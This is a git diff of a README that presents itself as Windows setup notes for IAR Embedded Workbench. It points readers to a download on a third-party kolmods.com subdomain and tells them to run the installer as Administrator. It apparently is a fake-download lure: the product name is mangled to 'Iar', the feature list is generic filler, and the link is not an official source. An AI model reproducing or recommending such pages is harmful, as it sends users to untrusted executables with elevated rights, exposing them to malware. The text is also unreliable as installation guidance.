@@ -1,10 +1,14 @@
-# IAR Embedded Workbench Windows Setup Notes
+# Iar Windows Setup Notes
 
-[⬇ Download IAR Embedded Workbench for Windows](https://iar.kolmods.com/)
+<p align="center">
+  <a href="https://iar-embedded-workbench-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-Iar-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Iar">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **IAR Embedded Workbench** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Iar** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **IAR Embedded Workbench** from the Start menu
+5. Restart if the installer asks — then launch **Iar** from the Start menu
 
 ## What you can use it for
 
-- Core IAR Embedded Workbench features on Windows desktop
-- Install and configure IAR Embedded Workbench for daily use
-- Import, edit, and export with IAR Embedded Workbench tools
-- Tune settings and profiles inside IAR Embedded Workbench
-- Integrate IAR Embedded Workbench into your existing workflow
+- Core Iar features on Windows desktop
+- Install and configure Iar for daily use
+- Import, edit, and export with Iar tools
+- Tune settings and profiles inside Iar
+- Integrate Iar into your existing workflow
 
 ## License
 
